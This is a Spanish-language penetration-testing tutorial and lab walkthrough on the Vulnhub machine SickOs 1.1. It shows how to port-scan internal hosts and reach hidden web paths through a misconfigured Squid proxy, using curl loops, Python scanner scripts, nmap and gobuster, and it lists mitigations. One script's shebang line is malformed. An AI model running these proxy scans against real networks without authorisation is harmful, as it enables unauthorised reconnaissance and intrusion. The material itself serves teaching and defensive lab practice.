
---
# Enumeración y Explotación de Proxies Squid

El **proxy Squid** es un servidor web de tipo _proxy-caché_ que actúa como intermediario entre los equipos de una red local y el acceso a Internet. Su función principal es centralizar el tráfico, filtrar contenido y almacenar en caché páginas web para mejorar el rendimiento y el control de acceso.

Este servidor se coloca entre nuestra red y la red externa, funcionando como una barrera de seguridad y como optimizador del tráfico.

![Captura](./Imágenes/ejemplo.png)

## ¿Cómo puede usarse Squid en un ataque?

Si un servidor Squid está mal configurado, puede permitir conexiones desde direcciones IP externas sin aplicar controles de acceso ni autenticación. Esto nos abre la posibilidad de utilizar el proxy para realizar tareas de reconocimiento, como la enumeración de puertos internos en redes que normalmente estarían fuera de nuestro alcance.

En otras palabras, podríamos usar el Squid como punto intermedio para explorar redes internas que, desde nuestro equipo, serían inaccesibles directamente.

---

## ¿Qué tipo de ataques podemos llevar a cabo?

El caso más común es el de un proxy Squid que:

- No requiere autenticación.
    
- Permite redirigir tráfico hacia direcciones IP internas.
    
- Responde a nuestras peticiones con contenido real.
    

En este escenario, podemos realizar escaneos de puertos en IPs privadas de la red interna a través del proxy.

---

## Ejemplo práctico

### Objetivo

Queremos comprobar si un servidor Squid en `10.10.11.131:3128` nos permite acceder a recursos internos.

### Prueba rápida con `curl`

Desde nuestra terminal ejecutamos:

```bash
curl --proxy http://10.10.11.131:3128 http://192.168.1.1:22
```

Si recibimos una respuesta (por ejemplo, "Connection refused", "SSH banner", etc.), es señal de que el proxy está redirigiendo correctamente nuestra petición a la red interna y que el puerto 22 en la IP `192.168.1.1` está activo o al menos accesible.

Podemos iterar esto manualmente para probar diferentes puertos:

```bash
for port in 21 22 80 443 3306; do
  echo "Probing port $port"
  curl --proxy http://10.10.11.131:3128 http://192.168.1.1:$port
done
```

---

## Ejemplo realista

Supongamos que durante un test de penetración, identificamos que una empresa utiliza Squid Proxy para gestionar el tráfico de una red segmentada. El proxy está mal configurado y no exige autenticación.

Detectamos que podemos usarlo para hacer peticiones HTTP hacia máquinas internas como `192.168.100.50`. Desde ahí, realizamos un escaneo de puertos con una herramienta como `spose` o un script personalizado, descubriendo que:

- El puerto 22 está abierto (SSH activo).
    
- El puerto 80 responde con un portal web interno.
    

A partir de esta información, podríamos continuar con ataques más específicos como enumeración de servicios, recolección de credenciales o explotación de servicios vulnerables.

---

## Herramientas útiles

### Spose

`spose` es una herramienta especializada en escaneo de puertos internos a través de proxies Squid. Nos permite automatizar pruebas como las anteriores, facilitando la detección de servicios expuestos de forma indebida.

Repositorio de `spose`:  
[https://github.com/aancw/spose](https://github.com/aancw/spose)

---

## Desarrollando nuestra propia herramienta

Como alternativa, podemos desarrollar una herramienta en Python que emule el comportamiento de `spose`. Usando la librería `requests`, podemos iterar sobre rangos de puertos o IPs y comprobar qué servicios están accesibles a través del proxy:

```python
import requests

proxy = {
    "http": "http://10.10.11.131:3128"
}

for port in range(20, 1025):
    url = f"http://192.168.1.10:{port}"
    try:
        r = requests.get(url, proxies=proxy, timeout=3)
        print(f"[+] Puerto {port} abierto o accesible (status {r.status_code})")
    except:
        pass
```

---

## Máquina de práctica

Podemos practicar esta técnica con la máquina vulnerable **SickOs 1.1** de Vulnhub, que incluye un escenario con Squid mal configurado.

Descarga:  
[https://www.vulnhub.com/entry/sickos-11,132/](https://www.vulnhub.com/entry/sickos-11,132/)

---

## Medidas de mitigación

Para evitar que se exploten servidores Squid mal configurados:

- Restringimos el acceso al proxy por IP, evitando conexiones externas.
    
- Activamos autenticación obligatoria para todo el tráfico saliente.
    
- Aplicamos reglas de firewall para impedir el acceso a IPs privadas desde el proxy.
    
- Monitorizamos y registramos el uso del proxy.
    

---

# Laboratorio, guía paso a paso de explotación

## Enumeración

Acción:

```bash
nmap -p- --open -sS -n -Pn --min-rate 5000 -vvv 192.168.1.62 -oG allPorts
nmap -p22,3128 -sCV 192.168.1.62 -oN targeted
```

Resultado:

```bash
# Nmap 7.94SVN scan initiated Wed Jun 11 13:41:32 2025 as: nmap -p22,3128 -sCV -oN targeted 192.168.1.62
Nmap scan report for 192.168.1.62
Host is up (0.00073s latency).
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 09:3d:29:a0:da:48:14:c1:65:14:1e:6a:6c:37:04:09 (DSA)
|   2048 84:63:e9:a8:8e:99:33:48:db:f6:d5:81:ab:f2:08:ec (RSA)
|_  256 51:f6:eb:09:f6:b3:e6:91:ae:36:37:0c:c8:ee:34:27 (ECDSA)
3128/tcp open  http-proxy Squid http proxy 3.1.19
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/3.1.19
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported: GET HEAD
MAC Address: 00:0C:29:90:11:5A (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jun 11 13:41:49 2025 -- 1 IP address (1 host up) scanned in 17.03 seconds
```

Explicación: confirmamos que esta corriendo un servicio *Squid proxy* `3128/tcp open  http-proxy Squid http proxy 3.1.19`

Acción:

```bash
curl http://192.168.1.62 --proxy http://192.168.1.62:3128
```

**Nota:** en caso de tener que autenticarnos, un ejemplo de cómo sería es el siguiente (usuario = admin; contraseña = password --> ejemplo)

```bash
curl http://192.168.1.62 --proxy http://admin:password@192.168.1.62:3128
```

Resultado:

```bash
<h1>
BLEHHH!!!
</h1>
```

Explicación: con **cURL** podemos probar a comprobar i el puerto 80 de la máquina víctima esta operativo a través del propio proxy de la máquina víctima. Y vemos que sí

---

Acción:

![Captura](./Imágenes/web_1.png)

![Captura](./Imágenes/web_2.png)

![Captura](./Imágenes/web_3.png)

Resultado:

![Captura](./Imágenes/web_4.png)

Explicación: con *Foxy Proxy* podemos configurar en 'Options' un nuevo proxy (Add), de forma que al tenerlo activo dirigirnos a la ruta donde esta el servidor por el puerto 80, vemos que se nos visualiza

---

Acción: enumeración de rutas con [Gobuster](../../Herramientas/Gobuster)

```bash
gobuster dir -u http://192.168.1.62/ --proxy http://192.168.1.62:3128/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20
```

Resultado:

```bash
/index                (Status: 200) [Size: 21]
/connect              (Status: 200) [Size: 109]
/robots               (Status: 200) [Size: 45]
/server-status        (Status: 403) [Size: 293]
```

Explicación: descubrimos rutas ocultas, como el archivo 'robots'

---

Acción:

```url
http://192.168.1.62/robots 
```

Resultado:

```html
User-agent: *
Disallow: /
Dissalow: /wolfcms
```

Explicación: descubrimos una nueva ruta, a la que tratamos de acceder

Acción:

```url
http://192.168.1.62/wolfcms 
```

Resultado:

![Captura](./Imágenes/web_5.png)

Explicación: vemos una web que estaba oculta tras el proxy SQUID detectado, todo esto no lo veríamos si no hubiéramos usado el proxy

---

Acción: para enumerar todos los puertos podemos crearnos un script en *Python*

```url
nvim squid_proxy_discovery.py
```

**Nota:** conjunto en python de los 50 puertos TCP más comunes

```bash
common_tcp_ports = {
    20,   # FTP (data)
    21,   # FTP (control)
    22,   # SSH
    23,   # Telnet
    25,   # SMTP
    53,   # DNS
    67,   # DHCP (servidor)
    68,   # DHCP (cliente)
    69,   # TFTP
    80,   # HTTP
    110,  # POP3
    111,  # RPCbind / Portmap
    135,  # Microsoft RPC
    137,  # NetBIOS Name Service
    138,  # NetBIOS Datagram Service
    139,  # NetBIOS Session Service
    143,  # IMAP
    161,  # SNMP
    162,  # SNMP Trap
    179,  # BGP
    389,  # LDAP
    443,  # HTTPS
    445,  # SMB
    465,  # SMTP sobre SSL
    512,  # exec
    513,  # login
    514,  # shell
    587,  # SMTP (envío autenticado)
    631,  # IPP (Impresión)
    993,  # IMAP sobre SSL
    995,  # POP3 sobre SSL
    1080, # SOCKS Proxy
    1433, # Microsoft SQL Server
    1434, # Microsoft SQL Monitor
    1521, # Oracle DB
    1723, # PPTP VPN
    2049, # NFS
    2082, # cPanel (no seguro)
    2083, # cPanel (SSL)
    2483, # Oracle DB (no seguro)
    2484, # Oracle DB (SSL)
    3306, # MySQL
    3389, # RDP
    3690, # Subversion
    4444, # Metasploit / varias shells
    5432, # PostgreSQL
    5900, # VNC
    5985, # WinRM (HTTP)
    5986, # WinRM (HTTPS)
    8080  # HTTP alternativo / proxies
}

```

**script:**

```python
#!/usr/env/bin python3

import sys, signal, requests

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

main_url = "http://127.0.0.1"
squid_proxy = {'http': 'http://192.168.1.62:3128'}

def portDiscovery():

    common_tcp_ports = {20,21,22,23,25,53,67,68,69,80,110,111,135,137,138,139,143,161,162,179,389,443,445,465,512,513,514,587,631,993,995,1080,1433,1434,1521,1723,2049,2082,2083,2483,2484,3306,3389,3690,4444,5432,5900,5985,5986,8080}

    for tcp_port in common_tcp_ports:

        r = requests.get(main_url + ':' + str(tcp_port), proxies=squid_proxy)

        if r.status_code != 503:
            print("\n[+] Port " + str(tcp_port) + " - OPEN")

if __name__ == '__main__':

    portDiscovery()
```

Resultado:

```bash
[+] Port 22 - OPEN

[+] Port 80 - OPEN

[+] Port 3306 - OPEN
```

Explicaicón: con este script hemos enumerado los puertos abiertos de este servidor proxy.  Vemos que esta el servicio `3306` de 'MySQL' abierto también

---




